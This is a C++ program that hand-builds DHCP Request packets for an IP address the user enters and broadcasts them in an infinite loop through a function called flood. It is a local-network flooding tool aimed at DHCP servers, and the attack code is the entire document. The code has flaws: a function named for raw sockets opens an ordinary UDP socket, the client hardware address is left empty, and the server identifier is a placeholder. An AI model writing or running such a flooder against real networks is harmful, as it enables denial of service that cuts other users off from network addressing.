#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define DHCP_REQUEST 3
#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68

// DHCP header structure
struct DhcpHeader {
    uint8_t  op;      // Message op code / message type
    uint8_t  htype;   // Hardware address type
    uint8_t  hlen;    // Hardware address length
    uint8_t  hops;    // Hops
    uint32_t xid;     // Transaction ID
    uint16_t secs;    // Seconds elapsed
    uint16_t flags;   // Flags
    uint32_t ciaddr;  // Client IP address
    uint32_t yiaddr;  // Your IP address
    uint32_t siaddr;  // Server IP address
    uint32_t giaddr;  // Gateway IP address
    uint8_t  chaddr[16]; // Client hardware address
    uint8_t  sname[64];  // Server host name
    uint8_t  file[128];  // Boot file name
    uint8_t  options[312]; // Optional parameters
};

// Function to create a raw socket
int createRawSocket() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to send a DHCP Request message
void sendDhcpRequest(int sockfd, const std::string& requestedIp) {
    DhcpHeader dhcpMsg;
    memset(&dhcpMsg, 0, sizeof(dhcpMsg));

    // Fill in DHCP message
    dhcpMsg.op = 1; // Message type: Boot Request
    dhcpMsg.htype = 1; // Ethernet
    dhcpMsg.hlen = 6; // Hardware address length
    dhcpMsg.xid = htonl(rand()); // Transaction ID
    dhcpMsg.flags = htons(0x8000); // Broadcast flag

    // Set the DHCP options
    dhcpMsg.options[0] = 0x63; // Magic cookie
    dhcpMsg.options[1] = 0x82;
    dhcpMsg.options[2] = 0x53;
    dhcpMsg.options[3] = 0x63;

    dhcpMsg.options[4] = 53; // DHCP Message Type
    dhcpMsg.options[5] = 1;
    dhcpMsg.options[6] = DHCP_REQUEST; // DHCP Request

    dhcpMsg.options[7] = 50; // Requested IP Address
    dhcpMsg.options[8] = 4;
    inet_pton(AF_INET, requestedIp.c_str(), &dhcpMsg.options[9]);

    // Option 54: DHCP Server Identifier (replace with the IP of the DHCP server)
    dhcpMsg.options[13] = 54;
    dhcpMsg.options[14] = 4;
    // Set a placeholder server IP; replace with actual server IP if known
    inet_pton(AF_INET, "192.168.1.0", &dhcpMsg.options[15]);

    // Option 55: Parameter Request List
    dhcpMsg.options[19] = 55;
    dhcpMsg.options[20] = 3;
    dhcpMsg.options[21] = 1; // Subnet Mask
    dhcpMsg.options[22] = 3; // Router
    dhcpMsg.options[23] = 6; // Domain Name Server

    dhcpMsg.options[24] = 255; // End Option

    // Send DHCP Request
    struct sockaddr_in destAddr;
    memset(&destAddr, 0, sizeof(destAddr));
    destAddr.sin_family = AF_INET;
    destAddr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    destAddr.sin_port = htons(DHCP_SERVER_PORT);

    if (sendto(sockfd, &dhcpMsg, sizeof(dhcpMsg), 0, 
               (struct sockaddr*)&destAddr, sizeof(destAddr)) < 0) {
        perror("sendto");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    std::cout << "DHCP Request message sent for IP: " << requestedIp << std::endl;
}

void flood(const std::string& requestedIp) {
    while (true)
    {
        srand(time(NULL));

        int sockfd = createRawSocket();
        
        // Set socket options to allow broadcasting
        int broadcastEnable = 1;
        if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcastEnable, sizeof(broadcastEnable)) < 0) {
            perror("setsockopt");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
        sendDhcpRequest(sockfd, requestedIp);

        close(sockfd);
    }
    
}

int main() {
    std::string requestedIp;
    std::cout << "Enter Your IP Address >> "; std::cin >> requestedIp;

    flood(requestedIp);

    return 0;
}